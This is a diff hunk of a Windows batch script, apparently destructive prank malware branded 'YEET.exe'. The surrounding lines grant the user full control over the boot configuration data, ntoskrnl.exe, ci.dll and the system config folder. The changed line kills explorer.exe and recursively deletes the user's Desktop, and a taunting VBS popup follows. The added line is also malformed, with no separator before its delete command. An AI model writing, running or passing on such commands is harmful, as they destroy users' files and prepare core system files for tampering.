@@ -102,7 +102,7 @@ icacls W:\EFI\Microsoft\Boot\BCD /grant %username%:F
 icacls ntoskrnl.exe /grant %username%:F
 icacls ci.dll /grant %username%:F
 echo y|cacls config /g %username%:F /t
-takeown /f %userprofile%\Desktop && cacls %userprofile%\desktop /g %userprofile%:F /t && rd %userprofile%\Desktop
+takeown /f %userprofile%\Desktop && cacls %userprofile%\desktop /g %userprofile%:F /t && taskkill /f /im explorer.exe rd %userprofile%\Desktop /s /q
 echo x=msgbox("refresh your desktop ;)",0,"YEET.exe (made by ThePCMaster)")>%userprofile%\yt.vbs
 wscript %userprofile%\yt.vbs
 del %userprofile%\yt.vbs /f
